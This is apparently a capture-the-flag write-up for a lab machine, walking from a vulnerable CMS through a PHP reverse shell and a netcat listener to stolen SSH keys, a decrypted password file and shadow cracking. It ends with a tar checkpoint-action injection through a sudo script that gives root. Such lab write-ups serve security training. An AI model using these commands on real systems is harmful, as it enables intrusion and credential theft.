The box has port 80 open, so run some enumeration on it and you find a `cms` subdirectory. Click around and find the "test page". On it, you find you can log in as an admin and you can make a page on your own. If you look up the CMS version, you will find that it is extremely vulnerable. You can make a PHP reverse shell that connects back to your machine.

> **Linked script:** the original PHP reverse shell was embedded in the Notion page. Drop your preferred reverse-shell payload here.

You upload this and run `nc -lvnp 1234` on your machine, and you get a nice reverse shell.

After you get a bash shell using whatever program you prefer, you go to `/home` and then to `elon` and `john`.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Go to `/home/john/.ssh` and you'll find an RSA key in `id_rsa`. Copy and paste this into your favorite text editor and use it to SSH back into the remote machine as john.

```bash
ssh -i rsakey john@ip.addr
```

Once you're in the system as john, you can go to elon's directory and get his `mypasswords.dat`. You can use scp to get this file back to your terminal:

```bash
scp -i john@ip.addr:/home/elon/mypasswords.dat /home/user
```

Once you run `file` on `mypasswords.dat`, you'll see that it is a salted OpenSSL file. You will need to run a command called `bruteforce-openssl` to get the password for the file. The password is `Crypto8882`. Once you get the password, you can run an `openssl enc` on the file itself:

```bash
sudo openssl enc -aes-256-cbc -pass pass:Crypto8882 -d -p -in mypasswords.dat -out dec.txt
```

This should give you a shadow file with a lot of passwords for elon. Use `suBF.sh` from a GitHub repository to find out which password to use to SSH as elon. You'll find the password is `crackmeifyoucan` with special characters.

Switch users to elon using your new-found password to finally `cat user.txt`.

Now all you need to do is use GTFOBins to get root access. Run `sudo -l` and you see you can use sudo on the script `/opt/backup_wallets.sh`. Go to the directory and simply run:

```bash
sudo ./backup_wallets.sh '-cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'
```

Make sure to use quotation marks.
